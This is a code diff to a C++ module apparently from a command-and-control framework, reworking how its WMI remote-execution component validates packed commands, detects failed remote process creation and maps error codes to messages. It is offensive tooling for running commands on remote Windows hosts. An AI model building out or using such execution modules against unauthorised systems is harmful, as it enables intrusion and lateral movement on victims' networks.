@@ -203,33 +203,7 @@ int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 }
 
 
-int WmiExec::process(C2Message& c2Message, C2Message& c2RetMessage)
-{
-    std::string cmd = c2Message.cmd();
-    c2RetMessage.set_instruction(c2RetMessage.instruction()); 
-    c2RetMessage.set_cmd(cmd); 
-    
-    int error=0;
-    std::string result;
-
-#ifdef _WIN32
-    error = execute(c2Message, result);
-#else
-    result = "Only supported on Windows.\n";
-#endif
-    
-    if(error)
-        c2RetMessage.set_errorCode(error);
-
-    c2RetMessage.set_instruction(c2Message.instruction());
-    c2RetMessage.set_cmd(c2Message.cmd());
-    c2RetMessage.set_returnvalue(result);
-
-    return 0;
-}
-
-
-#define ERROR_SUCCESS                         0
+#define C2_ERROR_SUCCESS                         0
 #define ERROR_COINITIALIZE_FAILED             1
 #define ERROR_COINITIALIZE_SECURITY_FAILED    2
 #define ERROR_CREATE_LOCATOR_FAILED           3
@@ -240,21 +214,70 @@ int WmiExec::process(C2Message& c2Message, C2Message& c2RetMessage)
 #define ERROR_SPAWN_INSTANCE_FAILED           8
 #define ERROR_PUT_COMMAND_FAILED              9
 #define ERROR_EXEC_METHOD_FAILED              10
+#define ERROR_CONFIG                        11
+#define ERROR_REMOTE_CREATE_FAILED          12
 #define ERROR_LINUX_UNSUPPORTED               100
 
-
-int WmiExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
+int WmiExec::process(C2Message& c2Message, C2Message& c2RetMessage)
 {
-#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
-    int errorCode = c2RetMessage.errorCode();
-    if(errorCode>0)
+    c2RetMessage.set_instruction(c2Message.instruction());
+    c2RetMessage.set_cmd(c2Message.cmd());
+    c2RetMessage.set_returnvalue("");
+
+#ifdef _WIN32
+    const std::string& packed = c2Message.cmd();
+    const size_t separators = std::count(packed.begin(), packed.end(), '\0');
+    bool valid = !packed.empty() && !c2Message.data().empty() &&
+        (separators == 0 || separators == 2 || separators == 3);
+    size_t start = 0;
+    while (valid && start < packed.size())
     {
-        errorMsg = c2RetMessage.returnvalue();
+        const size_t end = packed.find('\0', start);
+        valid = end != start;
+        start = end == std::string::npos ? packed.size() : end + 1;
+        if (end != std::string::npos && start == packed.size())
+            valid = false;
     }
+    if (!valid)
+    {
+        c2RetMessage.set_errorCode(ERROR_CONFIG);
+        return 0;
+    }
+    std::string result;
+    const int error = execute(c2Message, result);
+    c2RetMessage.set_errorCode(error);
+    if (error == C2_ERROR_SUCCESS)
+        c2RetMessage.set_returnvalue(result);
+#else
+    c2RetMessage.set_errorCode(ERROR_LINUX_UNSUPPORTED);
 #endif
     return 0;
 }
 
+int WmiExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
+{
+#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
+    switch (c2RetMessage.errorCode())
+    {
+    case C2_ERROR_SUCCESS: errorMsg.clear(); break;
+    case ERROR_COINITIALIZE_FAILED: errorMsg = "WMI COM initialization failed."; break;
+    case ERROR_COINITIALIZE_SECURITY_FAILED: errorMsg = "WMI COM security initialization failed."; break;
+    case ERROR_CREATE_LOCATOR_FAILED: errorMsg = "WMI locator creation failed."; break;
+    case ERROR_CONNECT_SERVER_FAILED: errorMsg = "WMI server connection failed."; break;
+    case ERROR_SET_PROXY_BLANKET_FAILED: errorMsg = "WMI proxy security setup failed."; break;
+    case ERROR_GET_OBJECT_FAILED: errorMsg = "WMI process object lookup failed."; break;
+    case ERROR_GET_METHOD_FAILED: errorMsg = "WMI process method lookup failed."; break;
+    case ERROR_SPAWN_INSTANCE_FAILED: errorMsg = "WMI input instance creation failed."; break;
+    case ERROR_PUT_COMMAND_FAILED: errorMsg = "WMI command setup failed."; break;
+    case ERROR_EXEC_METHOD_FAILED: errorMsg = "WMI process execution failed."; break;
+    case ERROR_CONFIG: errorMsg = "Invalid WMI request."; break;
+    case ERROR_REMOTE_CREATE_FAILED: errorMsg = "WMI remote process creation failed."; break;
+    case ERROR_LINUX_UNSUPPORTED: errorMsg = "WMI execution is only supported on Windows."; break;
+    default: errorMsg = "WMI execution failed with an unknown error."; break;
+    }
+#endif
+    return 0;
+}
 
 #ifdef _WIN32
 
@@ -477,6 +500,9 @@ int WmiExec::execute(C2Message &c2Message, std::string& result) const
     VARIANT varReturnValue;
     VariantInit(&varReturnValue);
     hres = pOutParams->Get(_bstr_t(L"ReturnValue"), 0, &varReturnValue, NULL, 0);
+    const bool remoteSuccess = SUCCEEDED(hres) &&
+        ((varReturnValue.vt == VT_I4 && varReturnValue.lVal == 0) ||
+         (varReturnValue.vt == VT_UI4 && varReturnValue.ulVal == 0));
     VariantClear(&varCommand);
     VariantClear(&varReturnValue);
 
@@ -490,8 +516,10 @@ int WmiExec::execute(C2Message &c2Message, std::string& result) const
     pLoc->Release();
     CoUninitialize();
 
+    if (!remoteSuccess)
+        return ERROR_REMOTE_CREATE_FAILED;
     result = "Success.";
-    return ERROR_SUCCESS;
+    return C2_ERROR_SUCCESS;
 }
 
 #endif
